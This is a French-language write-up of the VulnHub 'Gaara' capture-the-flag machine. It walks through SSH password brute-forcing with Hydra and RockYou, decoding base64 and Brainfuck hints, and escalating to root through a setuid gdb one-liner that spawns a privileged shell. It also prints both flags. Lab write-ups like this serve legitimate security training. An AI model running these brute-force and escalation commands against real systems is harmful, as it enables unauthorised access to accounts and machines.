# Solution du CTF Gaara de VulnHub

Disons le, ce CTF [Gaara](https://vulnhub.com/entry/gaara-1,629/) était loin d'être le plus agréable ou le plus intéressant.

Il commence sur une série de soit disant indices qui génèrent de la confusion. On final on brute force un compte supposé avec la wordlist RockYou et on obtient un shell.

La suite a un goût de déjà vu. C'est parti !

```
Nmap scan report for 192.168.56.54
Host is up (0.000079s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 3ea36f6403331e76f8e498febee98e58 (RSA)
|   256 6c0eb500e742444865effed77ce664d5 (ECDSA)
|_  256 b751f2f9855766a865542e05f940d2f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Gaara
|_http-server-header: Apache/2.4.38 (Debian)
```

J'ai brute-forcé les URLs du serveur web d'abord avec les wordlists `raft` de `fuzzdb` puis finalement avec la `directory-list-2.3-big.txt` de `DirBuster`. Cela m'a retourné la page `Cryoserver` qui contient trois références :

```
/Temari
/Kazekage
/iamGaara
```

Ces pages correspondent à un copier coller d'articles Wikipedia.

Le `imGaara` m'a laissé supposer qu'il y avait un compte `gaara` sur le système et n'ayant pas plus d'infos j'ai décidé de brute-forcer ce possible compte SSH.

J'ai d'abord eu recours à [CeWL is a Custom Word List Generator](https://github.com/digininja/cewl) pour générer une wordlist à partir des trois pages mais aucun mot de passe valide n'en est ressorti.

Finalement j'ai obtenu quelque chose avec RockYou :

```shellsession
$ ./hydra -l gaara -P rockyou.txt ssh://192.168.56.54
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-14 12:46:31
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344381 login tries (l:1/p:14344381), ~896524 tries per task
[DATA] attacking ssh://192.168.56.54:22/
[STATUS] 136.00 tries/min, 136 tries in 00:01h, 14344249 to do in 1757:53h, 12 active
[22][ssh] host: 192.168.56.54   login: gaara   password: iloveyou2
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-14 12:48:5
```

Ce mot de passe `iloveyou2` permet l'accès au SSH. Une fois connecté on trouve deux fichiers :

```
-rw-r--r-- 1 gaara gaara   33 Dec 13  2020 flag.txt
-rw-r--r-- 1 gaara gaara   57 Dec 13  2020 Kazekage.txt
```

Le premier est le flag `5451d3eb27acb16c652277d30945ab1e` et le second contient un message :

> You can find Kazekage here....  
> 
> L3Vzci9sb2NhbC9nYW1lcw==

Le base64 nous indique d'aller jeter un oeil dans `/usr/local/games` où l'on trouve un fichier texte qui a l'air encodé via [Brainfuck](https://fr.wikipedia.org/wiki/Brainfuck) :

```
Godaime Kazekage:

+++++ +++[- >++++ ++++< ]>+++ +.<++ ++++[ ->+++ +++<] >+.-- ---.< +++++
+++[- >---- ----< ]>--- -.<++ +++++ ++[-> +++++ ++++< ]>+++ +++++ .<+++
[->-- -<]>- .++++ ++.<+ +++++ +++[- >---- ----- <]>-- --.<+ +++++ +++[-
>++++ +++++ <]>+. <+++[ ->--- <]>-- --.-- --.<+ ++[-> +++<] >++.. <+++[
->+++ <]>++ ++.<+ +++++ +++[- >---- ----- <]>-- ----- -.<++ +++++ ++[->
+++++ ++++< ]>+++ .<+++ [->-- -<]>- --.+. +++++ .---. <++++ ++++[ ->---
----- <]>-- ----- ----. <++++ +++++ [->++ +++++ ++<]> +++++ +++.< +++[-
>---< ]>-.+ +++++ .<+++ +++++ +[->- ----- ---<] >---- .<+++ +++++ [->++
+++++ +<]>+ ++.<+ ++[-> +++<] >+++. +++++ +.--- ----- -.--- ----- .<+++
+++++ [->-- ----- -<]>- ---.< +++++ +++[- >++++ ++++< ]>+++ +++.+ ++.++
+++.< +++[- >---< ]>-.< +++++ +++[- >---- ----< ]>--- -.<++ +++++ ++[->
+++++ ++++< ]>++. ----. --.-- ----- -.<++ +[->+ ++<]> +++++ +.<++ +[->-
--<]> ---.+ .++++ +.--- ----. <++++ ++++[ ->--- ----- <]>-- ----- .<+++
+++++ +[->+ +++++ +++<] >+++. <+++[ ->--- <]>-- -.--- ----. <++++ [->++
++<]> +++.< +++++ ++++[ ->--- ----- -<]>- --.<+ +++++ ++[-> +++++ +++<]
>++++ +.--- -.<++ ++[-> ++++< ]>++. <+++[ ->--- <]>-. +++.< +++[- >+++<
]>+++ +.<++ +++++ [->-- ----- <]>-- ----- --.<+ ++++[ ->--- --<]> -----
-.<++ +++++ [->++ +++++ <]>++ +.<++ +++[- >++++ +<]>+ ++++. +++++ ++.<+
+++++ +++[- >---- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >++++ .<+++
++[-> +++++ <]>.< ++++[ ->+++ +<]>+ .<+++ [->-- -<]>- ----. +.<++ +[->+
++<]> ++++. <++++ +++++ [->-- ----- --<]> .<
```

On peut utiliser un décodeur en ligne qui nous donne le texte clair suivant :

> Did you really think you could find something that easily? Try Harder!

Devant cette impasse et en raison de l'absence d'entrées `sudo` je recherche les binaires setuid :

```shellsession
gaara@Gaara:~$ find / -user root -perm -u+s 2> /dev/null 
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/gdb
/usr/bin/sudo
/usr/bin/gimp-2.10
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/umount
```

Ce qui m'a plus surpris c'est la présence de Gimp :) On trouve bien une entrée correspondante sur [GTFObins](https://gtfobins.github.io/gtfobins/gimp/) mais toutes les techniques d'exploitation nécessite la présence d'un plugin pour l'exécution de code Python.

Sur le système on ne trouve que `script-fu` et ce dernier a un ensemble de commandes trop limitées. Au mieux il doit être possible d'exfiltrer des données en essayant de charger / sauver une image mais on risque de se cogner la tête sur la validation des formats.

L'entrée GTFObins pour GDB fonctionne bien, gdb supportant le Python depuis quelques années déjà : 

```shellsession
gaara@Gaara:~$ gdb -q -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
# id
uid=1001(gaara) gid=1001(gaara) euid=0(root) egid=0(root) groups=0(root),1001(gaara)
# cd /root
# ls
root.txt
# cat root.txt


 ██████╗  █████╗  █████╗ ██████╗  █████╗ 
██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗
██║  ███╗███████║███████║██████╔╝███████║
██║   ██║██╔══██║██╔══██║██╔══██╗██╔══██║
╚██████╔╝██║  ██║██║  ██║██║  ██║██║  ██║
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝

8a763d61f71db8e7aa237055de928d86

Congrats You have Rooted Gaara.

Give the feedback on Twitter if you Root this : @0xJin
```

*Publié le 14 novembre 2022*
